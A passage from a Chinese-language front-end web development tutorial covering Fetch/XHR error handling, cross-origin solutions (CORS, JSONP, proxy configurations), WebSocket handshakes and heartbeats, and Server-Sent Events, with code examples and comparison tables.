class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;application/json&#x27;</span>);<br>xhr.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span> &#125;));<br></code></pre></td></tr></table></figure><p>（3）错误处理</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Fetch (需手动处理HTTP错误)</span><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/data&#x27;</span>)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (res.<span class="hljs-property">status</span> &gt;= <span class="hljs-number">400</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;API error&#x27;</span>);<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>();<br>  &#125;);<br><br><span class="hljs-comment">// XHR (直接检测status)</span><br>xhr.<span class="hljs-property">onload</span> = <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">status</span> &gt;= <span class="hljs-number">200</span> &amp;&amp; xhr.<span class="hljs-property">status</span> &lt; <span class="hljs-number">300</span>) &#123;<br>    <span class="hljs-comment">// 成功</span><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 处理错误</span><br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>最佳实践建议</strong></p><ul><li>优先使用 Fetch：现代项目首选（浏览器支持率 &gt; 98%），配合 async&#x2F;await 提升可读性：</li><li>XHR 适用场景：<ul><li>需要上传&#x2F;下载进度条（xhr.upload.onprogress）</li><li>兼容 IE11 等老旧浏览器</li></ul></li><li>补充工具：<ul><li>超时处理和中断请求：</li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> controller = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>();<br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> controller.<span class="hljs-title function_">abort</span>(), <span class="hljs-number">5000</span>);<br><span class="hljs-title function_">fetch</span>(url, &#123; <span class="hljs-attr">signal</span>: controller.<span class="hljs-property">signal</span> &#125;);<br></code></pre></td></tr></table></figure><h3 id="跨域解决方案（CORS机制-JSONP-代理服务器）"><a href="#跨域解决方案（CORS机制-JSONP-代理服务器）" class="headerlink" title="跨域解决方案（CORS机制&#x2F;JSONP&#x2F;代理服务器）"></a>跨域解决方案（CORS机制&#x2F;JSONP&#x2F;代理服务器）</h3><p><strong>CORS（跨域资源共享）</strong></p><p>核心原理：</p><p>浏览器通过 HTTP头部协商 决定是否允许跨域请求，由服务器声明哪些外部域可访问资源。</p><p>关键流程：</p><ul><li>简单请求（Simple Request）：<ul><li>条件：GET&#x2F;HEAD&#x2F;POST + 特定头部（如Accept&#x2F;Content-Type: text&#x2F;plain）</li><li>浏览器直接发送请求，服务器响应：</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Access-Control-Allow-Origin</span><span class="hljs-punctuation">: </span>https://client.com  // 必须指定具体域名或*<br></code></pre></td></tr></table></figure></li><li>预检请求（Preflight Request）：<ul><li>触发条件：复杂操作（如PUT&#x2F;自定义头部&#x2F;Content-Type: application&#x2F;json）</li><li>浏览器先发OPTIONS请求：</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-keyword">OPTIONS</span> <span class="hljs-string">/api/data</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>https://client.com<br><span class="hljs-attribute">Access-Control-Request-Method</span><span class="hljs-punctuation">: </span>PUT<br><span class="hljs-attribute">Access-Control-Request-Headers</span><span class="hljs-punctuation">: </span>X-Custom-Header<br></code></pre></td></tr></table></figure><ul><li>服务器响应策略：</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">204</span> No Content<br><span class="hljs-attribute">Access-Control-Allow-Origin</span><span class="hljs-punctuation">: </span>https://client.com<br><span class="hljs-attribute">Access-Control-Allow-Methods</span><span class="hljs-punctuation">: </span>GET, POST, PUT<br><span class="hljs-attribute">Access-Control-Allow-Headers</span><span class="hljs-punctuation">: </span>X-Custom-Header<br><span class="hljs-attribute">Access-Control-Max-Age</span><span class="hljs-punctuation">: </span>86400  // 缓存预检结果（秒）<br></code></pre></td></tr></table></figure></li><li>带凭证的请求：<ul><li>前端设置：fetch(url, { credentials: ‘include’ })</li><li>服务器响应：</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Access-Control-Allow-Origin</span><span class="hljs-punctuation">: </span>https://client.com  // 不可用*<br><span class="hljs-attribute">Access-Control-Allow-Credentials</span><span class="hljs-punctuation">: </span>true<br></code></pre></td></tr></table></figure></li></ul><p>前端代码示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 允许跨域的服务器响应头</span><br>res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Origin&#x27;</span>, <span class="hljs-string">&#x27;https://client.com&#x27;</span>);<br>res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Methods&#x27;</span>, <span class="hljs-string">&#x27;GET, POST&#x27;</span>);<br></code></pre></td></tr></table></figure><p><strong>SONP（JSON with Padding）</strong></p><p>原理：</p><p>利用 <code>&lt;script&gt;</code> 标签不受同源策略限制的特性，通过回调函数接收跨域数据。</p><p>实现步骤：</p><p>（1）前端定义全局回调函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">handleResponse</span>(<span class="hljs-params">data</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Received:&#x27;</span>, data);<br>&#125;<br></code></pre></td></tr></table></figure><p>（2）动态创建 <code>&lt;script&gt;</code> 标签</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> script = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;script&#x27;</span>);<br>script.<span class="hljs-property">src</span> = <span class="hljs-string">&#x27;https://api.example.com/data?callback=handleResponse&#x27;</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(script);<br></code></pre></td></tr></table></figure><p>（3）服务器返回函数调用包裹的 JSON</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">handleResponse</span>(&#123; <span class="hljs-attr">status</span>: <span class="hljs-string">&#x27;success&#x27;</span>, <span class="hljs-attr">data</span>: [...] &#125;);<br></code></pre></td></tr></table></figure><p>局限性：</p><ul><li>仅支持 GET 请求</li><li>无错误处理机制（无法捕获404&#x2F;500）</li><li>存在XSS风险（需信任服务器）</li></ul><p><strong>代理服务器（Proxy Server）</strong></p><p>原理：</p><p>将跨域请求转发到同源代理服务器，由代理访问目标服务，避开浏览器同源策略。</p><p>实现方式：</p><p>（1）开发环境代理</p><p>适用场景：前端本地开发调试</p><p>实现工具：webpack.devServer</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">devServer</span>: &#123;<br>    <span class="hljs-attr">proxy</span>: &#123;<br>      <span class="hljs-string">&#x27;/api&#x27;</span>: &#123;<br>        <span class="hljs-attr">target</span>: <span class="hljs-string">&#x27;https://api.example.com&#x27;</span>,<br>        <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>,<br>        <span class="hljs-attr">pathRewrite</span>: &#123; <span class="hljs-string">&#x27;^/api&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span> &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>（2）生产环境反向代理</p><p>适用场景：线上部署</p><p>主流方案：nginx 配置</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>  <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>  <span class="hljs-attribute">server_name</span> my-domain.com;<br><br>  <span class="hljs-section">location</span> /api/ &#123;<br>    <span class="hljs-attribute">proxy_pass</span> https://api.example.com/;  <span class="hljs-comment"># 目标地址</span><br>    <span class="hljs-attribute">proxy_set_header</span> Host <span class="hljs-variable">$host</span>;<br>    <span class="hljs-attribute">proxy_set_header</span> X-Real-IP <span class="hljs-variable">$remote_addr</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>（3）无服务器代理</p><p>适用场景：无需维护基础设施</p><p>实现方案：Cloudflare Workers</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;fetch&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  event.<span class="hljs-title function_">respondWith</span>(<span class="hljs-title function_">handleRequest</span>(event.<span class="hljs-property">request</span>))<br>&#125;)<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleRequest</span>(<span class="hljs-params">request</span>) &#123;<br>  <span class="hljs-keyword">const</span> url = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(request.<span class="hljs-property">url</span>);<br>  url.<span class="hljs-property">hostname</span> = <span class="hljs-string">&#x27;api.example.com&#x27;</span>;  <span class="hljs-comment">// 替换目标域名</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">fetch</span>(url.<span class="hljs-title function_">toString</span>(), request);<br>&#125;<br></code></pre></td></tr></table></figure><p>（4）编程式中间件代理</p><p>适用场景：自定义代理逻辑</p><p>实现方式：Node.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> &#123; createProxyMiddleware &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http-proxy-middleware&#x27;</span>);<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;/external-api&#x27;</span>, <span class="hljs-title function_">createProxyMiddleware</span>(&#123;<br>  <span class="hljs-attr">target</span>: <span class="hljs-string">&#x27;https://third-party.com&#x27;</span>,<br>  <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>,<br>  <span class="hljs-attr">onProxyReq</span>: <span class="hljs-function">(<span class="hljs-params">proxyReq, req</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// 添加自定义请求头</span><br>    proxyReq.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;X-Proxy-Source&#x27;</span>, <span class="hljs-string">&#x27;my-server&#x27;</span>);<br>  &#125;<br>&#125;));<br></code></pre></td></tr></table></figure><p><strong>方案对比与选型</strong></p><table><thead><tr><th align="left">方案</th><th align="left">适用场景</th><th align="left">安全性</th><th align="left">复杂度</th><th align="left">协议支持</th></tr></thead><tbody><tr><td align="left">CORS</td><td align="left">可控的第三方API</td><td align="left">★★★</td><td align="left">★★</td><td align="left">全HTTP方法</td></tr><tr><td align="left">JSONP</td><td align="left">老旧浏览器兼容</td><td align="left">★</td><td align="left">★</td><td align="left">仅GET</td></tr><tr><td align="left">代理</td><td align="left">无法修改响应头的API</td><td align="left">★★★</td><td align="left">★★★</td><td align="left">全协议</td></tr></tbody></table><p><strong>安全风险规避</strong></p><ul><li>CORS：严格设置 Access-Control-Allow-Origin 为具体域名（禁用*）</li><li>JSONP：验证返回数据 + CSP防护</li><li>代理：限制可转发的域名防止滥用</li><li>所有方案均需配合HTTPS防止中间人攻击</li></ul><h2 id="2-2-实时通信"><a href="#2-2-实时通信" class="headerlink" title="2.2 实时通信"></a>2.2 实时通信</h2><h3 id="WebSocket协议（双向通信-心跳检测）"><a href="#WebSocket协议（双向通信-心跳检测）" class="headerlink" title="WebSocket协议（双向通信&#x2F;心跳检测）"></a>WebSocket协议（双向通信&#x2F;心跳检测）</h3><p><strong>双向通信机制</strong></p><p>基础原理：在单个TCP连接上建立全双工通信通道，实现客户端与服务器之间的持续双向数据流。</p><p>链接建立流程：</p><p>（1）HTTP握手升级：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-keyword">GET</span> <span class="hljs-string">/chat</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>example.com<br><span class="hljs-attribute">Upgrade</span><span class="hljs-punctuation">: </span>websocket          // 协议升级头<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>Upgrade<br><span class="hljs-attribute">Sec-WebSocket-Key</span><span class="hljs-punctuation">: </span>dGhlIHNhbXBsZSBub25jZQ==  // 客户端随机密钥<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">101</span> Switching Protocols<br><span class="hljs-attribute">Upgrade</span><span class="hljs-punctuation">: </span>websocket<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>Upgrade<br><span class="hljs-attribute">Sec-WebSocket-Accept</span><span class="hljs-punctuation">: </span>s3pPLMBiTxaQ9kYGzzhZRbK+xOo=  // 服务端验证响应<br></code></pre></td></tr></table></figure><p>（2）协议转换</p><ul><li>TCP连接保持打开状态</li><li>通信协议从HTTP切换为WebSocket（端口不变，默认80&#x2F;443）</li></ul><p>数据帧结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0                   1                   2                   3<br>0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1<br>+-+-+-+-+-------+-+-------------+-------------------------------+<br>|F|R|R|R| opcode|M| Payload len |    Extended payload length   |<br>|I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |<br>|N|V|V|V|       |S|             |   (if payload len==126/127)   |<br>| |1|2|3|       |K|             |                               |<br>+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +<br>|     Extended payload length continued, if payload len == 127  |<br>+ - - - - - - - - - - - - - - - +-------------------------------+<br>|                               |Masking-key, if MASK set to 1  |<br>+-------------------------------+-------------------------------+<br>| Masking-key (continued)       |          Payload Data         |<br>+-------------------------------- - - - - - - - - - - - - - - - +<br>:                     Payload Data continued ...                :<br>+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +<br>|                     Payload Data continued ...                |<br>+---------------------------------------------------------------+<br></code></pre></td></tr></table></figure><ul><li>opcode：数据类型（1&#x3D;文本，2&#x3D;二进制）</li><li>Payload len：数据长度（支持分片传输）</li><li>Masking-key：客户端到服务端数据掩码（安全规范）</li></ul><p><strong>心跳检测（Heartbeat）</strong></p><p>核心目的：</p><ul><li>检测连接存活状态</li><li>防止中间设备（NAT&#x2F;防火墙）断开”空闲”连接</li></ul><p>实现机制：</p><ul><li>心跳包：定时发送特殊控制帧（Ping&#x2F;Pong）</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 浏览器端发送Ping</span><br>websocket.<span class="hljs-title function_">ping</span>();<br><br><span class="hljs-comment">// 服务端响应Pong（自动回复）</span><br>websocket.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;ping&#x27;</span>, <span class="hljs-function">() =&gt;</span> websocket.<span class="hljs-title function_">pong</span>());<br></code></pre></td></tr></table></figure><ul><li>帧类型：</li></ul><table><thead><tr><th align="left">类型</th><th align="left">方向</th><th align="left">载荷长度</th></tr></thead><tbody><tr><td align="left">Ping</td><td align="left">客户端 → 服务器</td><td align="left">0-125字节</td></tr><tr><td align="left">Pong</td><td align="left">服务器 → 客户端</td><td align="left">同Ping</td></tr></tbody></table><p>配置参数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> ws = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>(<span class="hljs-string">&#x27;wss://example.com&#x27;</span>);<br><span class="hljs-comment">// 心跳间隔（建议25-30秒，小于NAT超时时间）</span><br><span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (ws.<span class="hljs-property">readyState</span> === <span class="hljs-title class_">WebSocket</span>.<span class="hljs-property">OPEN</span>) &#123;<br>    ws.<span class="hljs-title function_">ping</span>();  <span class="hljs-comment">// 发送心跳</span><br>  &#125;<br>&#125;, <span class="hljs-number">25000</span>);<br></code></pre></td></tr></table></figure><p>异常处理：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">ws.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;close&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (event.<span class="hljs-property">code</span> === <span class="hljs-number">1006</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;连接异常断开（心跳超时）&#x27;</span>);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>与传统 HTTP 对比</strong></p><table><thead><tr><th align="left">特性</th><th align="left">WebSocket</th><th align="left">HTTP轮询&#x2F;长轮询</th></tr></thead><tbody><tr><td align="left">连接方式</td><td align="left">1个持久TCP连接（全双工）</td><td align="left">多次HTTP请求（半双工）</td></tr><tr><td align="left">头部开销</td><td align="left">首次握手后仅2-14字节帧头</td><td align="left">每次请求完整HTTP头部</td></tr><tr><td align="left">延迟</td><td align="left">毫秒级实时推送</td><td align="left">数百毫秒至秒级</td></tr><tr><td align="left">适用场景</td><td align="left">聊天&#x2F;实时游戏&#x2F;金融报价</td><td align="left">简单通知（兼容性要求高）</td></tr></tbody></table><p><strong>前端开发实践</strong></p><p>（1）浏览器 API</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> ws = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>(<span class="hljs-string">&#x27;wss://api.example.com/ws&#x27;</span>);<br><br><span class="hljs-comment">// 监听消息</span><br>ws.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;收到数据:&#x27;</span>, event.<span class="hljs-property">data</span>);<br>&#125;;<br><br><span class="hljs-comment">// 发送数据</span><br>ws.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">action</span>: <span class="hljs-string">&#x27;subscribe&#x27;</span>, <span class="hljs-attr">channel</span>: <span class="hljs-string">&#x27;news&#x27;</span> &#125;));<br><br><span class="hljs-comment">// 错误处理</span><br>ws.<span class="hljs-property">onerror</span> = <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;WebSocket错误:&#x27;</span>, error);<br>&#125;;<br></code></pre></td></tr></table></figure><p>（2）关键优化</p><ul><li>二进制传输</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 发送ArrayBuffer提升性能</span><br><span class="hljs-keyword">const</span> buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">128</span>);<br>ws.<span class="hljs-title function_">send</span>(buffer);<br></code></pre></td></tr></table></figure><ul><li>自动重连</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">ws.<span class="hljs-property">onclose</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">setTimeout</span>(connect, <span class="hljs-number">3000</span>);<br></code></pre></td></tr></table></figure><ul><li>流量控制：监控ws.bufferedAmount避免内存溢出</li></ul><p><strong>协议限制</strong></p><ul><li>不支持HTTP&#x2F;2多路复用（需独立连接）</li><li>移动网络切换时需手动重连</li><li>旧版代理可能阻断WebSocket流量</li></ul><blockquote><p>现代浏览器支持率：全局 &gt; 98%（包括移动端）</p></blockquote><h3 id="Server-Sent-Events（SSE）应用场景"><a href="#Server-Sent-Events（SSE）应用场景" class="headerlink" title="Server-Sent Events（SSE）应用场景"></a>Server-Sent Events（SSE）应用场景</h3><p><strong>SSE 核心特性</strong></p><p>协议本质：基于 HTTP 的单向通信协议，允许服务器主动向客户端推送文本数据，保持长连接。</p><p>技术特点：</p><table><thead><tr><th align="left">特性</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">单向通信</td><td align="left">仅服务端→客户端方向（对比 WebSocket 双向）</td></tr><tr><td align="left">HTTP 基础</td><td align="left">使用标准 HTTP 协议，无额外端口需求</td></tr><tr><td align="left">自动重连</td><td align="left">内置断线重连机制（客户端自动恢复连接）</td></tr><tr><td align="left">轻量级协议</td><td align="left">数据格式简单（纯文本流），协议开销小</td></tr><tr><td align="left">浏览器原生支持</td><td align="left">通过 EventSource API 实现（IE 除外）</td></tr></tbody></table><p><strong>技术选型对比</strong></p><table><thead><tr><th align="left">场景需求</th><th align="left">SSE</th><th align="left">WebSocket</th><th align="left">HTTP 轮询</th></tr></thead><tbody><tr><td align="left">服务器→客户端单向推送</td><td align="left">✔️ 最佳</td><td align="left">⚠️ 过度设计</td><td align="left">❌ 高延迟</td></tr><tr><td align="left">双向交互</td><td align="left">❌ 不支持</td><td align="left">✔️ 原生支持</td><td align="left">❌ 低效</td></tr><tr><td align="left">浏览器兼容性</td><td align="left">✔️ 除IE</td><td align="left">✔️ 广泛</td><td align="left">✔️ 全支持</td></tr><tr><td align="left">协议复杂度</td><td align="left">★☆☆</td><td align="left">★★★</td><td align="left">★★☆</td></tr><tr><td align="left">部署成本</td><td align="left">★☆☆</td><td align="left">★★☆</td><td align="left">★☆☆</td></tr></tbody></table><p><strong>最佳实践</strong></p><p>（1）前端实现</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> es = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventSource</span>(<span class="hljs-string">&#x27;/api/stream&#x27;</span>);<br><br><span class="hljs-comment">// 监听自定义事件</span><br>es.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;stock&#x27;</span>, <span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123;<br>  <span class="hljs-title function_">renderStock</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(e.<span class="hljs-property">data</span>));<br>&#125;);<br><br><span class="hljs-comment">// 错误处理 + 自动重连</span><br>es.<span class="hljs-property">onerror</span> = <span class="hljs-function">() =&gt;</span> &#123;<br>  es.<span class="hljs-title function_">close</span>();<br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventSource</span>(...), <span class="hljs-number">5000</span>);<br>&#125;;<br></code></pre></td></tr></table></figure><p>（2）服务端要求</p><ul><li>响应头设置：</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/event-stream<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br></code></pre></td></tr></table></figure><ul><li>数据格式规范：</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Text">event: notification  // 事件类型<br>id: 1678901234       // 消息ID（用于断线续传）<br>data: &#123;&quot;msg&quot;:&quot;Hello&quot;&#125;// 数据内容（可多行）<br>retry: 10000         // 重连间隔（毫秒）<br>\n\n                 // 消息结束符（两个换行）<br></code></pre></td></tr></table></figure><p><strong>不适用场景</strong></p><ul><li>需要客户端频繁上传数据（如实时游戏）→ 选 WebSocket</li><li>二进制数据传输（如视频流）→ 选 WebRTC&#x2F;WebSocket</li><li>IE 浏览器支持 → 降级为 HTTP 长轮询</li></ul><p><strong>理想适用场景</strong></p><ul><li>只读数据流</li><li>低频事件通知</li><li>简单进度更新</li><li>兼容标准 HTTP 